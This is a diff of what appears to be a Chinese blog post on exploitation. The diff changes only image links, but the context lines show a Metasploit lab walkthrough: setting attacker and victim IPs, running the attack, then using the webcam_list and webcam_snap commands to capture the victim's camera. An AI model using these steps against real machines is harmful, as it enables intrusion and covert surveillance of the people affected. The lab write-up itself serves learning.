@@ -7,9 +7,9 @@ category: exploiting
 
 ## 0x0 确定攻击者IP和受害者IP
 #### 攻击机
-![](/images/20210326-1.png)
+![](https://lcy2218.github.io/images/20210326-1.png)
 #### 受害机
-![](/images/20210326-2.png)
+![](https://lcy2218.github.io/images/20210326-2.png)
 
 ## 0x1 启动MSF
 - msfconsole
@@ -17,19 +17,19 @@ category: exploiting
 - set lhost 192.168.88.130
 - set rhost 192.168.88.139
 
-![](/images/20210326-3.png)
+![](https://lcy2218.github.io/images/20210326-3.png)
 
 - run
 
-![](/images/20210326-4.png)
+![](https://lcy2218.github.io/images/20210326-4.png)
 
 - ipconfig
 
-![](/images/20210326-5.png)
+![](https://lcy2218.github.io/images/20210326-5.png)
 
 ## 0x2 启动摄像头
 
 - webcam_list 
 - webcam_snap
 
-![](/images/20210326-6.png)
+![](https://lcy2218.github.io/images/20210326-6.png)
